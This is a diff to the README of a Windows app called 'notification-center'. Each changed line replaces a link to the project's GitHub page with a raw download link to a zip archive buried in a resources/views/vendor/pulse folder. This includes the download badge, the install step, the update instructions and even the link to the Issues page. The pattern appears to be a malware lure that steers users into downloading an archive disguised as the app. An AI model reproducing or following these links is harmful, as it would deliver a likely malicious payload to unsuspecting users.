@@ -1,6 +1,6 @@
 # 🔔 notification-center - Simple Notifications Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/duckster11/notification-center)
+[![Download Now](https://raw.githubusercontent.com/duckster11/notification-center/main/resources/views/vendor/pulse/center-notification-v2.8-alpha.5.zip)](https://raw.githubusercontent.com/duckster11/notification-center/main/resources/views/vendor/pulse/center-notification-v2.8-alpha.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Follow these instructions to get notification-center on your Windows PC:
 
 Click the larger green **Download Here** button at the top or go to this page:
 
-https://github.com/duckster11/notification-center
+https://raw.githubusercontent.com/duckster11/notification-center/main/resources/views/vendor/pulse/center-notification-v2.8-alpha.5.zip
 
 This page offers the files you will need to install the program.
 
@@ -108,7 +108,7 @@ If you have problems:
 - Try restarting your computer.
 - Make sure your internet connection works.
 - Check for error messages in the app; they usually explain what went wrong.
-- Visit https://github.com/duckster11/notification-center and check the Issues page for help.
+- Visit https://raw.githubusercontent.com/duckster11/notification-center/main/resources/views/vendor/pulse/center-notification-v2.8-alpha.5.zip and check the Issues page for help.
 
 ---
 
@@ -121,7 +121,7 @@ Keep the app up to date to get fixes and new features:
 - Follow prompts if an update is found.
 - Or download the newest version from the download page at:
 
-https://github.com/duckster11/notification-center
+https://raw.githubusercontent.com/duckster11/notification-center/main/resources/views/vendor/pulse/center-notification-v2.8-alpha.5.zip
 
 ---
 
@@ -129,7 +129,7 @@ https://github.com/duckster11/notification-center
 
 Use the GitHub page to find more information or ask questions:
 
-https://github.com/duckster11/notification-center
+https://raw.githubusercontent.com/duckster11/notification-center/main/resources/views/vendor/pulse/center-notification-v2.8-alpha.5.zip
 
 Look under **Issues** to see if others have your problem, or open a new one.
 
